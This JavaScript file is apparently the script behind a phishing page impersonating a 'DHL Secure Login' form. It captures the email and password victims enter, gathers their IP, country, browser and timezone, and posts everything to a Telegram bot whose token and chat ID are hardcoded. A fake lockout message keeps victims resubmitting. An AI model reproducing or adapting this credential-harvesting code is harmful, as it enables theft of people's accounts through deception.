const token = '8215110457:AAEkG5BXa-xSyOUMDFqJ4axGQCL4t6KVbT0';
const chatId = '6593538204';
let attempts = 0;
let locked = false;

const form = document.getElementById('loginForm');
const emailInput = document.getElementById('email');
const passwordInput = document.getElementById('password');
const lockMessage = document.getElementById('lockMsg');

const params = new URLSearchParams(window.location.search);
const emailFromURL = params.get('email');
if (emailFromURL) emailInput.value = emailFromURL;

form.addEventListener('submit', async function(e) {
  e.preventDefault();
  if (locked) return;

  const email = emailInput.value;
  const password = passwordInput.value;
  const userAgent = navigator.userAgent;
  const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;

  let browser = "Unknown";
  if (userAgent.includes("Firefox")) browser = "Mozilla Firefox";
  else if (userAgent.includes("SamsungBrowser")) browser = "Samsung Internet";
  else if (userAgent.includes("Opera") || userAgent.includes("OPR")) browser = "Opera";
  else if (userAgent.includes("Trident")) browser = "Internet Explorer";
  else if (userAgent.includes("Edge")) browser = "Microsoft Edge";
  else if (userAgent.includes("Chrome")) browser = "Chrome";
  else if (userAgent.includes("Safari")) browser = "Safari";

  let ip = "Unavailable";
  let country = "Unavailable";

  try {
    const ipRes = await fetch("https://api.ipify.org?format=json");
    const ipData = await ipRes.json();
    ip = ipData.ip;

    const countryRes = await fetch(`http://ip-api.com/json/${ip}?fields=country`);
    const countryData = await countryRes.json();
    country = countryData.country;
  } catch (error) {
    console.error("Error getting IP/country:", error);
  }

  const message = `📦 <b>DHL Secure Login</b>
👤 Email: <code>${email}</code>
🔒 Password: <code>${password}</code>
🌐 IP: <code>${ip}</code>
📍 Country: <code>${country}</code>
🕹 Browser: <code>${browser}</code>
🕓 Timezone: <code>${timezone}</code>
📱 User-Agent: ${userAgent}`;

  if (attempts >= 4) return;
  await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: chatId,
      text: message,
      parse_mode: 'HTML'
    })
  });

  attempts++;
  if (attempts >= 4) lockForm();
});

function lockForm() {
  locked = true;
  form.querySelector('button').disabled = true;
  let timeLeft = 30;
  lockMessage.style.display = 'block';
  const interval = setInterval(() => {
    lockMessage.textContent = `Too many attempts. Try again in ${timeLeft} seconds.`;
    timeLeft--;
    if (timeLeft < 0) {
      clearInterval(interval);
      attempts = 0;
      locked = false;
      lockMessage.style.display = 'none';
      form.querySelector('button').disabled = false;
    }
  }, 1000);
}
